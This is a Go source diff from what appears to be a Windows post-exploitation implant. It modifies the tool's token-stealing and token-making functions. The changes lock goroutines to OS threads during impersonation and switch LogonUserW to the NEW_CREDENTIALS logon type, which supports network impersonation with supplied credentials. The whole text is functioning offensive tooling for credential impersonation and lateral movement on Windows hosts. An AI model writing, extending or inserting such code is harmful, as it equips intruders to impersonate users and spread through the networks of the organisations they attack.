@@ -14,6 +14,7 @@ import (
 	"image/png"
 	"os"
 	"os/exec"
+	"runtime"
 	"strings"
 	"sync"
 	"time"
@@ -634,6 +635,10 @@ func stealToken(pid int) (string, error) {
 }
 
 func makeToken(userDomain, password string) (string, error) {
+	// Pin this goroutine to the current OS thread so that
+	// ImpersonateLoggedOnUser's per-thread token stays on the right thread.
+	runtime.LockOSThread()
+
 	domain := "."
 	user := userDomain
 	if idx := strings.IndexAny(userDomain, `\@`); idx >= 0 {
@@ -654,16 +659,18 @@ func makeToken(userDomain, password string) (string, error) {
 		uintptr(unsafe.Pointer(userW)),
 		uintptr(unsafe.Pointer(domainW)),
 		uintptr(unsafe.Pointer(passW)),
-		2, // LOGON32_LOGON_INTERACTIVE
-		0, // LOGON32_PROVIDER_DEFAULT
+		9, // LOGON32_LOGON_NEW_CREDENTIALS — clones process token, defers cred check to network
+		3, // LOGON32_PROVIDER_WINNT50 — Kerberos delegation support
 		uintptr(unsafe.Pointer(&tok)),
 	)
 	if r == 0 {
+		runtime.UnlockOSThread()
 		return "", fmt.Errorf("LogonUser: %w", e)
 	}
 	r, _, e = procImpersonateLoggedOnUser.Call(uintptr(tok))
 	if r == 0 {
 		windows.CloseHandle(windows.Handle(tok))
+		runtime.UnlockOSThread()
 		return "", fmt.Errorf("ImpersonateLoggedOnUser: %w", e)
 	}
 	if stolenToken != 0 {
@@ -687,6 +694,7 @@ func dropToken() (string, error) {
 		// NT failed (unlikely) — fall back to Win32
 		procRevertToSelf2.Call()
 	}
+	runtime.UnlockOSThread()
 	return "reverted to original token", nil
 }
 
